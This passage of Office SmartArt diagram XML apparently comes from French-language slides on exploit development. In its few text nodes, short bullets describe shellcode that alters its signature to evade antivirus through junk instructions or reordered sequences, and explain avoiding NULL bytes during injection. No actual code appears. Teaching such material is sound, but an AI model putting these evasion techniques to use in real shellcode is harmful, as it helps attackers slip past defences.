    <dgm:cxn modelId="{1BD90041-79F6-4D2B-AF25-6A40EA387B8D}" srcId="{1AC7A80F-B680-4146-9940-45829E8C171E}" destId="{6B524840-1B4A-42FD-8EE8-8A250F4791E7}" srcOrd="1" destOrd="0" parTransId="{7C201A4E-8DE2-4218-8A26-B253D705F703}" sibTransId="{025475AF-02CD-4D5A-ACA5-812429EACC5D}"/>
    <dgm:cxn modelId="{79A89B41-192A-9B46-B4C8-2F8659C87ECC}" type="presOf" srcId="{1AC7A80F-B680-4146-9940-45829E8C171E}" destId="{3B6B6062-B9A0-F142-B600-2307F8678E8C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{6CBDF154-DA84-124E-9CA9-E1010A228BC7}" type="presOf" srcId="{5F531FFE-7AF3-41CD-A059-30446C246A7C}" destId="{EB9E70A2-6D0E-AC4B-982D-90177EDBBBED}" srcOrd="0" destOrd="1" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{B713786B-89F4-4C14-8491-5D671B9373CC}" srcId="{6B524840-1B4A-42FD-8EE8-8A250F4791E7}" destId="{491F5C6A-5EC1-44B8-8100-7D8DB245EB11}" srcOrd="2" destOrd="0" parTransId="{5D4917DE-51BE-4FA9-9E53-630952317C0F}" sibTransId="{D36B1EB7-4184-43B7-90D7-237443563C62}"/>
    <dgm:cxn modelId="{C48CA690-58F0-FE4A-B4E7-CACF9E3B034D}" type="presOf" srcId="{6B524840-1B4A-42FD-8EE8-8A250F4791E7}" destId="{C20AF52E-DD95-4D44-A4E5-041F225F3F5E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{862C3FCB-5965-4F45-84D6-8F1E1763CBA0}" srcId="{6B524840-1B4A-42FD-8EE8-8A250F4791E7}" destId="{6CC57B05-B47E-43B1-8049-2CFD1153C1B8}" srcOrd="0" destOrd="0" parTransId="{151FF100-633E-4F68-91BD-EC81223620F6}" sibTransId="{32B2DE5A-327D-4637-91E5-C86CC59528EA}"/>
    <dgm:cxn modelId="{9F848BE9-E53E-E447-B6F4-C826702ECF5E}" type="presOf" srcId="{6CC57B05-B47E-43B1-8049-2CFD1153C1B8}" destId="{EB9E70A2-6D0E-AC4B-982D-90177EDBBBED}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C19AEC79-335E-B949-95DC-8F1FB6C217E0}" type="presParOf" srcId="{3B6B6062-B9A0-F142-B600-2307F8678E8C}" destId="{F5B0E0A6-80D9-6340-926D-600C09AAA371}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{9A5ADAF9-49D1-E14A-8FF9-ED36BE01F9C3}" type="presParOf" srcId="{F5B0E0A6-80D9-6340-926D-600C09AAA371}" destId="{CCF95279-28E3-AA4D-9089-B27DB541495A}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{2EFB148D-AF0A-CA43-9A1B-798AC9380D4C}" type="presParOf" srcId="{F5B0E0A6-80D9-6340-926D-600C09AAA371}" destId="{1B1D3F02-FDDB-6840-947E-51F484BE5D2F}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{2A8F6DDE-1245-9744-BD5B-85116C3A1045}" type="presParOf" srcId="{3B6B6062-B9A0-F142-B600-2307F8678E8C}" destId="{6B0E1094-6197-8440-B9DF-700BCEC8C0C9}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{21A1720E-9019-2F46-A785-884040F6926F}" type="presParOf" srcId="{3B6B6062-B9A0-F142-B600-2307F8678E8C}" destId="{AD13EA0E-436A-A744-983A-8A14E416496F}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{9FA84C9D-2869-414C-BDF9-DCF9B6B0FD48}" type="presParOf" srcId="{3B6B6062-B9A0-F142-B600-2307F8678E8C}" destId="{FAB01CF3-4FC7-5048-AF30-5EF68E2370E6}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{9DEBA68D-9F1C-DB4B-80C5-DA87BFD0942C}" type="presParOf" srcId="{3B6B6062-B9A0-F142-B600-2307F8678E8C}" destId="{C5405049-10FA-1342-8FB4-BA6DA1117AA9}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{94CBD596-F768-2F44-B3C3-9AEA54315A77}" type="presParOf" srcId="{C5405049-10FA-1342-8FB4-BA6DA1117AA9}" destId="{C20AF52E-DD95-4D44-A4E5-041F225F3F5E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{006170B8-9DA3-C445-83F6-3796FC1BF643}" type="presParOf" srcId="{C5405049-10FA-1342-8FB4-BA6DA1117AA9}" destId="{CCE9B90D-2AA0-9140-9AD7-57835614303A}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{91AE835B-0E5C-3140-ABC4-F71EB8BA36B5}" type="presParOf" srcId="{3B6B6062-B9A0-F142-B600-2307F8678E8C}" destId="{C15C7DD8-5FE7-E04C-BD75-3882DCCC1325}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0C0ADCA7-9C3E-0548-83B0-8861E083D34A}" type="presParOf" srcId="{3B6B6062-B9A0-F142-B600-2307F8678E8C}" destId="{EB9E70A2-6D0E-AC4B-982D-90177EDBBBE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965742E1-E89F-4D9B-A5E4-820B2B3AAB5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476BCE-E869-4D76-BC5F-127E274CE1EC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Qu’est-ce que c’est ?</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6FD9312A-0D25-4786-A3C7-A7758FF3F317}" type="parTrans" cxnId="{39291E41-6A04-4F87-8008-8A54EA305A74}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C8908073-F0E9-4167-9340-31D0CF5B7668}" type="sibTrans" cxnId="{39291E41-6A04-4F87-8008-8A54EA305A74}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E6974832-ECCE-43C7-BC90-D12B93689AA6}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Un shellcode qui modifie sa signature pour éviter la détection par les antivirus.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{605FA10D-26A3-4A47-9752-7E72CE16BB8A}" type="parTrans" cxnId="{34E041F4-7EF5-4B5F-8DC6-CFC6B9102984}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{8464929C-DDDF-4322-9A59-470E74E0AFE0}" type="sibTrans" cxnId="{34E041F4-7EF5-4B5F-8DC6-CFC6B9102984}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2FF2E2D0-DAF4-47B0-8DFE-F0A3893F51D3}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Technique :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{556E6444-D484-4DB5-B6F1-CB890CC5E29D}" type="parTrans" cxnId="{C06B8E5F-EA41-498E-A95D-F029F9E24125}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3AE58CFF-CB15-422C-8149-935330126C20}" type="sibTrans" cxnId="{C06B8E5F-EA41-498E-A95D-F029F9E24125}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{40D48979-8DB5-4CF9-A202-50CD5BFAFE01}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Ajouter des instructions inutiles ou modifier les séquences.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{3DF31427-C840-4FBA-93E3-84ABA7202589}" type="parTrans" cxnId="{03364396-4400-4DE8-B02B-2784A887099C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{7AD104D9-D76F-4A76-AA34-9CC280B6DE08}" type="sibTrans" cxnId="{03364396-4400-4DE8-B02B-2784A887099C}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{E6238C32-C50F-8F4B-ADB2-A0E6BB99097C}" type="pres">
      <dgm:prSet presAssocID="{965742E1-E89F-4D9B-A5E4-820B2B3AAB53}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A07B2CE4-C2B2-7E47-B8AE-1EC082FD2472}" type="pres">
      <dgm:prSet presAssocID="{74476BCE-E869-4D76-BC5F-127E274CE1EC}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{BF4201BA-1F93-9B47-80EA-0B824CE022C5}" type="pres">
      <dgm:prSet presAssocID="{74476BCE-E869-4D76-BC5F-127E274CE1EC}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{EEF82B96-9C11-524A-913F-0FD77B7C6146}" type="pres">
      <dgm:prSet presAssocID="{74476BCE-E869-4D76-BC5F-127E274CE1E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710E781-312B-8449-9698-909E5D0CEB9F}" type="pres">
      <dgm:prSet presAssocID="{74476BCE-E869-4D76-BC5F-127E274CE1EC}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{47F89D07-F384-5444-A3CC-C6ECA4521762}" type="pres">
      <dgm:prSet presAssocID="{74476BCE-E869-4D76-BC5F-127E274CE1EC}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D3279C56-A917-4A41-81FE-CACC0825BB2D}" type="pres">
      <dgm:prSet presAssocID="{C8908073-F0E9-4167-9340-31D0CF5B7668}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5511D118-3587-A348-BB4C-108BBBBC7906}" type="pres">
      <dgm:prSet presAssocID="{2FF2E2D0-DAF4-47B0-8DFE-F0A3893F51D3}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{EFD7D969-18A0-654D-9A10-F6C23CB889CF}" type="pres">
      <dgm:prSet presAssocID="{2FF2E2D0-DAF4-47B0-8DFE-F0A3893F51D3}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{F0E401C6-A37E-1344-940A-11D2B2CF8B11}" type="pres">
      <dgm:prSet presAssocID="{2FF2E2D0-DAF4-47B0-8DFE-F0A3893F51D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8D3A8E7-7A9A-CE4E-95B1-A90CC74ADCFA}" type="pres">
      <dgm:prSet presAssocID="{2FF2E2D0-DAF4-47B0-8DFE-F0A3893F51D3}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{73FCECE8-5F24-D14C-86BD-327B96C060A5}" type="pres">
      <dgm:prSet presAssocID="{2FF2E2D0-DAF4-47B0-8DFE-F0A3893F51D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2570706-D833-8844-9519-92C5D7DD02B5}" type="presOf" srcId="{965742E1-E89F-4D9B-A5E4-820B2B3AAB53}" destId="{E6238C32-C50F-8F4B-ADB2-A0E6BB99097C}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{09D9562E-57E6-FF46-A891-C9265B014D37}" type="presOf" srcId="{E6974832-ECCE-43C7-BC90-D12B93689AA6}" destId="{47F89D07-F384-5444-A3CC-C6ECA4521762}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{39291E41-6A04-4F87-8008-8A54EA305A74}" srcId="{965742E1-E89F-4D9B-A5E4-820B2B3AAB53}" destId="{74476BCE-E869-4D76-BC5F-127E274CE1EC}" srcOrd="0" destOrd="0" parTransId="{6FD9312A-0D25-4786-A3C7-A7758FF3F317}" sibTransId="{C8908073-F0E9-4167-9340-31D0CF5B7668}"/>
    <dgm:cxn modelId="{DDE31E4C-A90C-F048-A340-8A178F784067}" type="presOf" srcId="{74476BCE-E869-4D76-BC5F-127E274CE1EC}" destId="{EEF82B96-9C11-524A-913F-0FD77B7C6146}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C06B8E5F-EA41-498E-A95D-F029F9E24125}" srcId="{965742E1-E89F-4D9B-A5E4-820B2B3AAB53}" destId="{2FF2E2D0-DAF4-47B0-8DFE-F0A3893F51D3}" srcOrd="1" destOrd="0" parTransId="{556E6444-D484-4DB5-B6F1-CB890CC5E29D}" sibTransId="{3AE58CFF-CB15-422C-8149-935330126C20}"/>
    <dgm:cxn modelId="{38338564-B063-2D4F-8736-49996A4FD1C0}" type="presOf" srcId="{2FF2E2D0-DAF4-47B0-8DFE-F0A3893F51D3}" destId="{F0E401C6-A37E-1344-940A-11D2B2CF8B11}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{03364396-4400-4DE8-B02B-2784A887099C}" srcId="{2FF2E2D0-DAF4-47B0-8DFE-F0A3893F51D3}" destId="{40D48979-8DB5-4CF9-A202-50CD5BFAFE01}" srcOrd="0" destOrd="0" parTransId="{3DF31427-C840-4FBA-93E3-84ABA7202589}" sibTransId="{7AD104D9-D76F-4A76-AA34-9CC280B6DE08}"/>
    <dgm:cxn modelId="{67980CA1-3ACB-CE4A-96A9-3C4980B8D551}" type="presOf" srcId="{74476BCE-E869-4D76-BC5F-127E274CE1EC}" destId="{BF4201BA-1F93-9B47-80EA-0B824CE022C5}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{226D39C4-4766-1C47-87CC-5DF9DCB41B8B}" type="presOf" srcId="{40D48979-8DB5-4CF9-A202-50CD5BFAFE01}" destId="{73FCECE8-5F24-D14C-86BD-327B96C060A5}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{FC63EBDE-10F8-BE49-B0F3-878BA273570B}" type="presOf" srcId="{2FF2E2D0-DAF4-47B0-8DFE-F0A3893F51D3}" destId="{EFD7D969-18A0-654D-9A10-F6C23CB889CF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{34E041F4-7EF5-4B5F-8DC6-CFC6B9102984}" srcId="{74476BCE-E869-4D76-BC5F-127E274CE1EC}" destId="{E6974832-ECCE-43C7-BC90-D12B93689AA6}" srcOrd="0" destOrd="0" parTransId="{605FA10D-26A3-4A47-9752-7E72CE16BB8A}" sibTransId="{8464929C-DDDF-4322-9A59-470E74E0AFE0}"/>
    <dgm:cxn modelId="{2DEB261D-C8E5-5A4B-9BAA-666A82DEB2F6}" type="presParOf" srcId="{E6238C32-C50F-8F4B-ADB2-A0E6BB99097C}" destId="{A07B2CE4-C2B2-7E47-B8AE-1EC082FD2472}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{F2241976-62EC-E748-AD78-AB61C2961F91}" type="presParOf" srcId="{A07B2CE4-C2B2-7E47-B8AE-1EC082FD2472}" destId="{BF4201BA-1F93-9B47-80EA-0B824CE022C5}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8638128E-5064-4D41-BC55-F04591B4D6E4}" type="presParOf" srcId="{A07B2CE4-C2B2-7E47-B8AE-1EC082FD2472}" destId="{EEF82B96-9C11-524A-913F-0FD77B7C6146}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{D0099204-0428-6E41-8E88-0B2D21B14CB6}" type="presParOf" srcId="{E6238C32-C50F-8F4B-ADB2-A0E6BB99097C}" destId="{1710E781-312B-8449-9698-909E5D0CEB9F}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C9F9E868-0F94-DB42-A848-E5398E29526E}" type="presParOf" srcId="{E6238C32-C50F-8F4B-ADB2-A0E6BB99097C}" destId="{47F89D07-F384-5444-A3CC-C6ECA4521762}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{CF606547-EA84-8049-BD53-1A95DCBA4B9D}" type="presParOf" srcId="{E6238C32-C50F-8F4B-ADB2-A0E6BB99097C}" destId="{D3279C56-A917-4A41-81FE-CACC0825BB2D}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{7E8F35FD-5804-C84C-A25B-A3A52E64030E}" type="presParOf" srcId="{E6238C32-C50F-8F4B-ADB2-A0E6BB99097C}" destId="{5511D118-3587-A348-BB4C-108BBBBC7906}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{B5A88F06-472A-BC4B-B8FE-22143E9D67EA}" type="presParOf" srcId="{5511D118-3587-A348-BB4C-108BBBBC7906}" destId="{EFD7D969-18A0-654D-9A10-F6C23CB889CF}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{69EBDE19-EF11-3342-B2A2-AEDB9616CF10}" type="presParOf" srcId="{5511D118-3587-A348-BB4C-108BBBBC7906}" destId="{F0E401C6-A37E-1344-940A-11D2B2CF8B11}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{465144F0-36C0-3744-B8A7-64DEDD0AA297}" type="presParOf" srcId="{E6238C32-C50F-8F4B-ADB2-A0E6BB99097C}" destId="{08D3A8E7-7A9A-CE4E-95B1-A90CC74ADCFA}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{5E19C3E9-D80D-DD4B-B2E1-B20A1A823AD8}" type="presParOf" srcId="{E6238C32-C50F-8F4B-ADB2-A0E6BB99097C}" destId="{73FCECE8-5F24-D14C-86BD-327B96C060A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3C47B5FA-02B3-40E7-B973-4AD83EEF52B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08E545-C76D-4BF1-ABBD-7882BA81E069}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Pourquoi éviter les NULL bytes ?</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{04DE71D1-851F-4AA8-AEAD-ABCE53AE3DD0}" type="parTrans" cxnId="{A6C3D2F3-3172-439C-8D00-72C67E57D5BE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{835EB46B-B0DC-4961-8A93-581E3E7BA2D0}" type="sibTrans" cxnId="{A6C3D2F3-3172-439C-8D00-72C67E57D5BE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{342592F5-B5F8-4254-B3E6-0A54291E2A00}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Interruption de la chaîne de caractères lors de l’injection.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{12733328-4F9D-413F-B2C5-1B82136D460F}" type="parTrans" cxnId="{E7466611-89B9-488C-B3D2-E1EA46A86CD9}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{24E6A303-9929-4C08-8D07-6932BB88A39F}" type="sibTrans" cxnId="{E7466611-89B9-488C-B3D2-E1EA46A86CD9}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D5B810B9-5570-480D-8DBD-39FB65BB1ACE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Solution :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4B5EB875-7024-40CF-BA66-43442FA056E7}" type="parTrans" cxnId="{6DEA616C-E1D9-42E7-85E7-65DA4C59C241}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{F9BD4EAF-81C6-445F-A009-F593495B1A93}" type="sibTrans" cxnId="{6DEA616C-E1D9-42E7-85E7-65DA4C59C241}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{25C29079-169D-49AD-8ECB-25FC1AFEA74A}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Utiliser des instructions qui génèrent des valeurs sans NULL.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{987F5609-95B0-4B42-BFD1-B9F87350B4EF}" type="parTrans" cxnId="{238D3CCF-1C5D-4E56-9A97-9DC379C98FE7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9A615A1D-DEF3-445C-91BE-46E678C6FDEB}" type="sibTrans" cxnId="{238D3CCF-1C5D-4E56-9A97-9DC379C98FE7}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{BE479CDF-341A-054D-922E-59C4175FC286}" type="pres">
      <dgm:prSet presAssocID="{3C47B5FA-02B3-40E7-B973-4AD83EEF52B0}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{30593AAD-4909-6D45-8620-AB1002129532}" type="pres">
      <dgm:prSet presAssocID="{4008E545-C76D-4BF1-ABBD-7882BA81E069}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{658B51C4-B5E9-E147-917D-984533922ABB}" type="pres">
      <dgm:prSet presAssocID="{4008E545-C76D-4BF1-ABBD-7882BA81E069}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7E0F583A-C4CE-724E-B85D-27DA84F3BFF4}" type="pres">
      <dgm:prSet presAssocID="{4008E545-C76D-4BF1-ABBD-7882BA81E06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F43E820-D1A9-6140-AB99-C7056F5DD47E}" type="pres">
      <dgm:prSet presAssocID="{4008E545-C76D-4BF1-ABBD-7882BA81E069}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{D87BCF0B-06F2-9B48-91C8-0C4EF94C3898}" type="pres">
      <dgm:prSet presAssocID="{4008E545-C76D-4BF1-ABBD-7882BA81E069}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{6972E312-D199-514A-A9C3-B93A007464D4}" type="pres">
      <dgm:prSet presAssocID="{835EB46B-B0DC-4961-8A93-581E3E7BA2D0}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{278ECA22-E4C5-7F4A-8377-CA2AD7551BEE}" type="pres">
      <dgm:prSet presAssocID="{D5B810B9-5570-480D-8DBD-39FB65BB1ACE}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{734DD581-4482-9044-8BAF-A96E1931CA64}" type="pres">
      <dgm:prSet presAssocID="{D5B810B9-5570-480D-8DBD-39FB65BB1ACE}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{677AB83F-B04D-3045-A601-91356C8615B9}" type="pres">
      <dgm:prSet presAssocID="{D5B810B9-5570-480D-8DBD-39FB65BB1AC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76C8D36-B8DA-FC45-B442-0F4F6C86CF17}" type="pres">
      <dgm:prSet presAssocID="{D5B810B9-5570-480D-8DBD-39FB65BB1ACE}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{A03F4655-8B06-DC4C-8C76-8F3A5949CE1E}" type="pres">
